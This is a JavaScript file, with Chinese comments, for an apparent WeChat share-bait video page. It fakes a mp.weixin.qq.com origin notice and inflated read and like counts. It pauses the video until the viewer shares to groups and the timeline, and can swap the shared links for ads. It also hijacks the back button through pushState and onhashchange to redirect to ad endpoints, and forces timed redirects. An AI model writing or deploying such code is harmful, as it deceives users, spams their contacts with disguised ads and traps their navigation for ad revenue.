    // 返回开关 值为 0 表示关 值为 1 表示开
    var fanhui = 1
    // 视频点赞和阅读量修改
    var likeAndview = new Array()
    likeAndview['web'] = '网页由 mp.weixin.qq.com 提供</br> QQ浏览器X5内核提供技术支持' // 下拉网址伪装
    likeAndview['view'] = '今天看点'        // 顶部超链接文本
    likeAndview['readword'] = '阅读原文'    // 阅读原文超链接文本
    likeAndview['readNum'] = '100000+'      // 阅读量修改
    likeAndview['likeNum'] = '97315'        // 点赞量修改
    //视频上方广告
    var ad_1 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_1['on'] = 0
    // 广告下标
    ad_1['item'] = 'nk'
    // 广告图片
    ad_1['img'] = 'http://wx2.sinaimg.cn/mw690/bda2923dgy1fndzpsy561g20go02ogty.gif'
    //视频下方广告
    var ad_2 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_2['on'] = 1
    // 广告下标
    ad_2['item'] = 'xs_sz_qr'
    // 广告图片
    ad_2['img'] = 'http://bgzrwl.cn/se01/images/00669utAgy1flvjfrv7h3g30hs0243yg.gif'
    //阅读原文下方广告
    var ad_3 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_3['on'] = 0
    // 广告下标
    ad_3['item'] = 'nk'
    // 广告图片
    ad_3['img'] = 'http://xmzjvip.b0.upaiyun.com/2017/12/04/5701f26f6648e8fa3b1ede664b6945f2.gif'
    //最下方广告
    var ad_4 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_4['on'] = 1
    // 广告下标
    ad_4['item'] = 'nk'
    // 广告图片
    ad_4['img'] = 'http://wx2.sinaimg.cn/mw690/00668fWEly1fnv704lo8ag30go05kgti.gif'
    //阅读原文 和点击公众号
    var ad_gzh = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    // ad_gzh['on'] = 0
    // 广告下标
    ad_gzh['item'] = 'xs_sz_qr,xs_swsj_qr'
    // 广告图片
    ad_gzh['img'] = 'nk'
    

    // 0表示先分享群后分享圈 1表示先分享圈后分享群
    var timelineOnOff = 0
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告
    var TTimes = new Array('0'); // 朋友圈广告开关 
    // 分享朋友圈次数
    var Tnum = 2
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告   
    var ATimes = new Array('0'); // 朋友广告开关    
    // 分享朋友群次数 
    var Anum = 4

 // 视频基础信息
    var sp_title = escape("今日推荐");
    var sp_id = "r06587w4ls3";
    var sp_time = "271";
    var baidu = "767edeaf076e791633a18cce8fab3ecd"
    var diqu = ''

    // api域名
    var apidomain = '//' + location.hostname

    var autotime = 60000*15 //毫秒
    var timestamp = Date.parse(new Date());

    fanhui && openfh()

    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?" + baidu;
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();


    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function openfh()
    {
        window.onhashchange = function() {
           ggcash('fanhui');
        }
    }


    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function autoskip()
    {
        if (autotime < (Date.parse(new Date()) - timestamp)) {
            $.post(apidomain, {
                index: 'xxp'
            }, function(res) {
                location.href = res.url;
            }, 'JSON');
        } else {
            setTimeout(function(){
                window.autoskip()
            },500);
        }
    }

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     * 统一广告入口
     */
    function ggcash(name) {
        location.href = apidomain + "/" + name + "/cash";
    }

    function setCookie(name, value) {
        var Days = 1;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 6 * 1000);
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
    }

    function getCookie(name) {
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
        if (arr = document.cookie.match(reg)) return unescape(arr[2]);
        else return null;
    }

    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return decodeURI(r[2]);
        }
        return null;
    }
    var shareATimes = 0;
    var shareTTimes = 0;
    var alertTimes = 0;
    var message = null;


    var Tpost = null
    var Apost = null


    !(function(){
        var temp = new Array()
        for (var i = 0; i < TTimes.length; i++) {
            temp["'"+TTimes[i]+"'"] = TTimes[i]
            if (1 <= i) {
                Tpost = '1'
            } else {
                Tpost = TTimes[i]
            }
        }
        TTimes = temp
        temp = new Array()

        for (var i = 0; i < ATimes.length; i++) {
            temp["'"+ATimes[i]+"'"] = ATimes[i]
            if (1 <= i) {
                Apost = '1'
            } else {
                Apost = ATimes[i]
            }
        }
        ATimes = temp
    })()

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function wxconfig()
    {
        $.post(apidomain, {
            url: location.href.split('#')[0],
            index: 'jump'
        }, function(res) {
            window.data = res;
            wx.config(window.data.config);
            shaerdata();
        }, 'JSON');

        autoskip()
    }
    function wxalert(msg, btn, callback) {
        if (alertTimes == 0) {
            var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
            $("body").append(dialog)
        }
        alertTimes++;
        var d = $('#lly_dialog');
        d.show(200);
        d.find("#lly_dialog_msg").html(msg);
        d.find("#lly_dialog_btn").html(btn);
        d.find("#lly_dialog_btn").off('click').on('click', function() {
            d.hide(200);
            if (callback) {
                callback()
            }
        })
    }

/*    function share_tip() {
        share_config(window.result);
        if (0 === shareATimes && 1 < shareTTimes) {
            message = window.result.share_info.a0
            wxalert(message, '好')
        } else {
            switch (shareATimes) {
                case 1:
                    message = window.result.share_info.a1
                    wxalert(message, '好')
                    break;
                case 2:
                    message = window.result.share_info.a2
                    wxalert(message, '好')
                    break;
                case 3:
                    message = window.result.share_info.a3
                    wxalert(message, '好')
                    break;
                default:
                    if (1 === shareTTimes && Tpost === '0' && shareATimes !== 0) {
                        message = window.result.share_info.success
                        wxalert(message, '确定', function() {
                            setCookie('xxxooo', '1');
                            $.post(apidomain, {
                                index: 'goon'
                            }, function(res) {
                                location.href = res.url;
                            }, 'JSON');
                        })
                    } else if (1 === shareTTimes && shareATimes !== 0) {
                        message = window.result.share_info.timeline
                        wxalert(message, '好')
                    } else if (2 <= shareTTimes) {
                        message = window.result.share_info.success
                        wxalert(message, '确定', function() {
                            setCookie('xxxooo', '1');
                            $.post(apidomain, {
                                index: 'goon'
                            }, function(res) {
                                location.href = res.url;
                            }, 'JSON');
                        })
                    } else if (shareATimes === 0) {
                        message = window.result.share_info.a0
                        wxalert(message, '好')
                    } else {
                        message = window.result.share_info.a4
                        wxalert(message, '好')
                    }
            }
        }
    }*/


    function share_tip() {
        share_config(window.result);
        if (Anum > shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if  (Anum <= shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if ("0" == Tpost && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                setCookie('xxxooo', 1);
                $.post(apidomain, {
                    index: 'goon'
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else if (Tnum > shareTTimes && "0" !== Tpost) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && 0 === shareATimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                setCookie('xxxooo', 1);
                $.post(apidomain, {
                    index: 'goon'
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        }
    }

    function show_tip() {
        wxalert(message, '好')
    }

  

/*    function shaerdata() {
        $.post(apidomain, {
            index: 'duapp',
            TTimes: Tpost,
            ATimes: Apost,
            Qun: window.data.qun,
            Quan: window.data.quan,
        }, function(data) {
            window.result = data;

            message = data.share_info.default
            share_config(data);
        }, 'JSON');
    }*/

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function shaerdata() {
        $.post(apidomain, {
            index: 'duapp',
            TTimes: Tpost,
            ATimes: Apost,
            Qun: window.data.qun,
            Quan: window.data.quan,
            Timeline: timelineOnOff,
        }, function(data) {
            window.result = data;
            message = data.share_info.default
            share_config(data);
        }, 'JSON');
    }


    function share_config(data) {
        wx.ready(function() {
            wx.hideOptionMenu();
            wx.showMenuItems({
                menuList: ['menuItem:share:appMessage', 'menuItem:share:timeline']
            });
            wx.onMenuShareAppMessage({
                title: ATimeslen() ? diqu + data.share_gg_info.title : diqu + data.share_app_info.title,
                desc: ATimeslen() ? diqu + data.share_gg_info.desc : diqu + data.share_app_info.desc,
                link: ATimeslen() ? data.share_gg_info.link : data.share_app_info.link,
                imgUrl: ATimeslen() ? data.share_gg_info.img_url : data.share_app_info.img_url,
                success: function() {
                    shareATimes += 1;
                    share_tip();
                },
                cancel: function() {}
            });
            wx.onMenuShareTimeline({
                title: TTimeslen() ? diqu + data.share_timeline_cash_info.title : diqu + data.share_timeline_info.title,
                link: TTimeslen() ? data.share_timeline_cash_info.link : data.share_timeline_info.link,
                imgUrl: TTimeslen() ? data.share_timeline_cash_info.img_url : data.share_timeline_info.img_url,
                success: function() {
                    shareTTimes += 1;
                    share_tip();
                },
                cancel: function() {}
            });
        });
    }
    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function ATimeslen() {
        if ('undefined' !== typeof ATimes['999']) {
            return true
        } else if ('undefined' !== typeof ATimes['0']) {
            return false
        } else if ('undefined' !== typeof ATimes["'"+(shareATimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }
    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function TTimeslen() {
        if ('undefined' !== typeof TTimes['999']) {
            return true
        } else if ('undefined' !== typeof TTimes['0']) {
            return false
        } else if ('undefined' !== typeof TTimes["'"+(shareTTimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function adimg() {
        //广告图片
        $(function() {
            $("#adimg1").find("img").attr("src", ad_1['img']);
            $("#adimg2").find("img").attr("src", ad_2['img']);
            $("#adimg3").find("img").attr("src", ad_3['img']);
            $("#adimg4").find("img").attr("src", ad_4['img']);
            ad_1['on'] && $("#adimg1").show();
            ad_2['on'] && $("#adimg2").show();
            ad_3['on'] && $("#adimg3").show();
            ad_4['on'] && $("#adimg4").show();
        })

        $('#content-content').html(likeAndview['web']);
        $('#js_view_source').html(likeAndview['readword']);
        $('#readNum').html(likeAndview['readNum']);
        $('#likeNum').html(likeAndview['likeNum']);
        document.title = diqu + likeAndview['view'];
        $('#post-user').html(diqu + likeAndview['view']);
    }
    //视频上方广告
    function onclick_adimg1() {
        ggcash(ad_1['item']);
    }
    //视频下方广告
    function onclick_adimg2() {
        // ggcash(ad_2['item']);
    }
    //阅读原文下方广告
    function onclick_adimg3() {
        ggcash(ad_3['item']);
    }
    // 最下方广告
    function onclick_adimg4() {
        ggcash(ad_4['item']);
    }
    //阅读原文 和点击公众号
    function gzh() {
        ggcash(ad_gzh['item']);
    }

    if (getCookie('delaytime') == null) {
        if (tip == 'goon') {
            setCookie('delaytime', '9999');
        } else {
            setCookie('delaytime', sp_time);
        }
    }
    if (tip == 'ok') {
        setTimeout('jssdk()', 500);
    }
    var pageGlobal = {};
    hturl = '';
    pageGlobal.vid = sp_id;
    pageGlobal.playStatus = '';
    pageGlobal.delayTime = parseInt(getCookie('delaytime'));
    var video, player;
    var vid = pageGlobal.vid;
    var playStatus = 'pending';
    new Swiper('.swiper-container', {
        autoplay: 5000
    }); 
    $(function() {
        var elId = 'mod_player_skin_0';
        $("#js_content").html('<div id="' + elId + '" class="player_skin" style="padding-top:6px;"></div>');
        var elWidth = $("#js_content").width();
        playVideo(vid, elId, elWidth);
        $("#pauseplay").height($("#js_content").height() - 10);
        if (playStatus == 'pending') {
            var delayTime = pageGlobal.delayTime;
            var isFirst = true;
            setInterval(function() {
                try {
                    var currentTime = player.getCurTime();
                    if (currentTime >= delayTime) {
                        $('#pauseplay').show();
                        player.callCBEvent('pause');
                        $.cookie(vid, 's', {
                            path: '/'
                        });
                        if (isFirst) {
                            $('#pauseplay').trigger('click');
                        }
                        isFirst = false;
                    }
                } catch (e) {}
            }, 500);
        }
        var h = $('#scroll').height();
        $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
        new IScroll('#wrapper', {
            useTransform: false,
            click: true
        });
        setTimeout(function() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
        }, 200);
    });

    function playVideo(vid, elId, elWidth) {
        //定义视频对象
        video = new tvp.VideoInfo();
        //向视频对象传入视频vid
        video.setVid(vid);
        //定义播放器对象
        player = new tvp.Player(elWidth, 200);
        //设置播放器初始化时加载的视频
        player.setCurVideo(video);
        //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
        //player.addParam("autoplay","1"); 
        player.addParam("wmode", "transparent");
        player.addParam("pic", tvp.common.getVideoSnapMobile(vid));
        player.onallended = function(){ggcash('2xian')}
        player.write(elId);
        // playerid()
    }
    $('#pauseplay').on('click', function() {
        setCookie('xxxooo', '1');
        $.post(apidomain, {
            index: 'ok'
        }, function(res) {
            location.href = res.url;
        }, 'JSON');
    });
    $('#like').on('click', function() {
        var $icon = $(this).find('i');
        var $num = $(this).find('#likeNum');
        var num = 0;
        if (!$icon.hasClass('praised')) {
            num = parseInt($num.html());
            if (isNaN(num)) {
                num = 0;
            }
            $num.html(++num);
            $icon.addClass("praised");
        } else {
            num = parseInt($num.html());
            num--;
            if (isNaN(num)) {
                num = 0;
            }
            $num.html(num);
            $icon.removeClass("praised");
        }
    });


    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function playerid()
    {
        try {
            var dom = document.getElementById(player.playerid)
            dom.setAttribute("playsinline","")
            dom.setAttribute("webkit-playsinline","")
            dom.setAttribute("x5-playsinline","")
            dom.setAttribute("controls","")
        } catch (e){
            setTimeout(function(){
                window.playerid()
            },100)
        }
    }

    function jump(url) {
        var a = document.createElement('a');
        a.setAttribute('rel', 'noreferrer');
        a.setAttribute('id', 'm_noreferrer');
        a.setAttribute('href', url);
        document.body.appendChild(a);
        document.getElementById('m_noreferrer').click();
        document.body.removeChild(a);
    }

    function jssdk() {
        $("#mask").css("height", $(document).height());
        $("#mask").css("width", $(document).width());
        $("#mask").show();
        $("#fenxiang").show();
        $('#game_result').hide();
        $('.time-out-num').hide();
        $('.bag').hide();
        show_tip();
    }
    // $.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js', function() {
    //     diqu = remote_ip_info.city;

    // });
    (function() {
        /**
         * 动态加载js文件
         * @param  {string}   url      js文件的url地址
         * @param  {Function} callback 加载完成后的回调函数
         */
        var _getScript = function(url, callback) {
            var head = document.getElementsByTagName('head')[0],
                js = document.createElement('script');
            js.setAttribute('type', 'text/javascript');
            js.setAttribute('src', url);
            head.appendChild(js);
            //执行回调
            var callbackFn = function() {
                if (typeof callback === 'function') {
                    callback();
                }
            };
            if (document.all) { //IE
                js.onreadystatechange = function() {
                    if (js.readyState == 'loaded' || js.readyState == 'complete') {
                        callbackFn();
                    }
                }
            } else {
                js.onload = function() {
                    callbackFn();
                }
            }
        }
        //如果使用的是zepto，就添加扩展函数
        if (Zepto) {
            $.getScript = _getScript;
        }
    })();
    $(function() {
        $('#fenxiang').on('click', function() {
            show_tip()
        });
        $('#mask').on('click', function() {
            show_tip()
        })
    });

    function anchor() {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime())
    }
    setTimeout('anchor()', 100);
    var d = new Date();
    var str = d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
    document.getElementById("post-date").innerHTML = str;

    document.getElementsByTagName('h2')[0].innerHTML = unescape(sp_title);
    if (getQueryString('hd') == 'ok') {
        setCookie('hd', 'ok');
    }
    // 执行广告开关
    adimg()

    // 执行wxconfig
    wxconfig()